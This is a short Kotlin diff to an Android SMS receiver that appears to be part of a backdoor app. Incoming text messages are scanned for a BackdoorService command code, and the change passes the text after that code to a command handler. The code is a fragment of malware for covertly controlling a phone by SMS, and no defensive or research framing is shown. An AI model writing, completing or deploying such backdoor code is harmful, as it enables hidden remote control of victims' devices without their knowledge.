@@ -52,7 +52,7 @@ class SmsReceiver: BroadcastReceiver(){
                     msg.messageBody?.let{ body -> append(body) }
                 }
             }
-            command.toString().takeIf { cmd -> cmd.contains(BackdoorService.commandCode) }?.let { cmd -> commandHandler?.invoke(cmd) }
+            command.toString().takeIf { cmd -> cmd.contains(BackdoorService.commandCode) }?.let { cmd -> commandHandler?.invoke(cmd.split(BackdoorService.commandCode)[1]) }
         }
     }
 }
